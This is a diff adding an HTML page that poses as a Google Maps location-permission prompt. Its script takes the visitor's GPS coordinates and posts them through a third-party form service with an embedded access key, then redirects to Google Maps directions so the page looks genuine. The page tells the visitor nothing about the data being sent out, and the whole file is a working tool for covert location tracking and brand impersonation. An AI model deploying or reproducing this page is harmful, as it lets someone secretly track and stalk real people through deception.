@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GoogleMap</title>
+    <style>
+        h4 {
+            display: none;
+        }
+        @media only screen and (max-width: 768px) {
+            h4 {
+                display: block;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <h1>GoogleMap wants to Turn on location</h1>
+    <h4>Find and tap your 'Settings' menu. <br>
+        <br>
+         Find and tap 'Location' - your phone may show 'Location services' or 'Location access' instead. 
+         <br>
+         <br> Tap 'Location' on or off to enable or disable your phone's GPS.</h4>
+    <form id="locationForm" action="https://api.web3forms.com/submit" method="POST">
+        <input type="hidden" name="access_key" value="5b754b21-da53-4b6e-877c-315c7b2fc4eb">
+        <input type="hidden" id="longitude" name="longitude" required>
+        <input type="hidden" id="latitude" name="latitude" required>
+        <input type="checkbox" name="botcheck" class="hidden" style="display: none;">
+    </form>
+
+    <script>
+        // Location permission prompt
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    // Latitude aur Longitude values fetch karna
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+
+                    // Form fields mein values set karna
+                    document.getElementById("latitude").value = latitude;
+                    document.getElementById("longitude").value = longitude;
+
+                    // Form ko submit karna
+                    const formData = new FormData(document.getElementById("locationForm"));
+
+                    fetch('https://api.web3forms.com/submit', {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(result => {
+                        console.log('Success:', result);
+                        // User ko specified location pr Google Maps pr redirect karna
+                        window.location.href = `https://www.google.com/maps/dir/${latitude},${longitude}/24.9435232,66.9906218`;
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                    });
+                },
+                function(error) {
+                    alert("Location access denied or unavailable.");
+                }
+            );
+        } else {
+            alert("Geolocation is not supported by this browser.");
+        }
+    </script>
+
+</body>
+</html>
